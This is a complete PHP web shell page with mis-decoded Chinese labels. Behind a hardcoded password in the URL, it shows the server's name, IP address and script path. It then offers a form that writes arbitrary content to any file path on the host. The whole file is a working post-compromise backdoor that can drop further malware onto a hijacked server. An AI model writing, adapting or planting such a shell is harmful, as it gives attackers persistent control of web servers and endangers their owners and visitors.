<html>
<head>
<title>��ǰIP <?=$_SERVER['SERVER_NAME']?></title>
</head>
<style>
body{font-family:Georgia;}
#neirong{width:558px;height:250px;border=#0000 1px solid}
#lujing{font-family:Georgia;width:389px;border=#0000 1px solid}
#shc{font-family:Georgia;background:#fff;width:63px;height:20px;border=#0000 1px solid}
</style>
<body bgcolor="black">
<?php
$password="keio";/**�����޸�����**/
if ($_GET[pass]==$password){
  if ($_POST)
{
  $fo=fopen($_POST["lujing"],"w");
  if(fwrite($fo,$_POST["neirong"]))
   echo "<font color=red><b>�ɹ�д���ļ�!</b></font>";
  else
   echo "<font color=#33CCFF><b>д���ļ�ʧ��</b></font>";
  
}
else{
echo "<font color=#CCFFFF>��Դ��������php������С��</font>";
}
?><br><br>
<font color="#FFFF33">������IP����ǰ������<?=$_SERVER['SERVER_NAME']?>(<?=@gethostbyname($_SERVER['SERVER_NAME'])?>)<br>
��ǰҳ��ľ���·��:<?php echo $_SERVER["SCRIPT_FILENAME"]?>
<form action="" method="post">
�����ļ�·��:<input type="text" name="lujing" id="lujing" value='<?php echo $_SERVER["SCRIPT_FILENAME"]?>' />
<input type="submit" id="shc" value="д������" /><br />
<textarea name="neirong" id="neirong">
</textarea>
</form></font>
<?php
 }else{
?>
<form action="" method="GET">
<font color="#00FFCC">��������:<input type="password" name="pass" id="pass">


<input type="submit" name="denglu" value="����" /></form>
<?php } ?>